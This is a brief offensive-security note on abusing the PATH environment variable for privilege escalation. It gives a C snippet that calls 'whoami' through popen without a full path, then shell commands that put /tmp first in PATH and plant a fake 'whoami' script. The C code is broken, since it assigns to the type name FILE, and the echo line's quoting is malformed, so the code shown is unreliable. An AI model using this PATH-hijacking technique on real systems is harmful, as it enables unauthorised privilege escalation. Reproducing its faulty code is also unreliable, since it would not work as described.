# Abusing Environment Variables



## PATH

If there is a script that uses a command that relies on PATH we may be able to abuse this by changing the directory of PATH.

```c
#include <stdio.h>

int main() {
    FILE = popen("whoami", "r");
    printf(FILE);
}
```

Create malicious whoami to abuse PATH.

```
export PATH=/tmp:$PATH
echo "printf "root"" >> whoami
chmod +x whoami
whoami
```

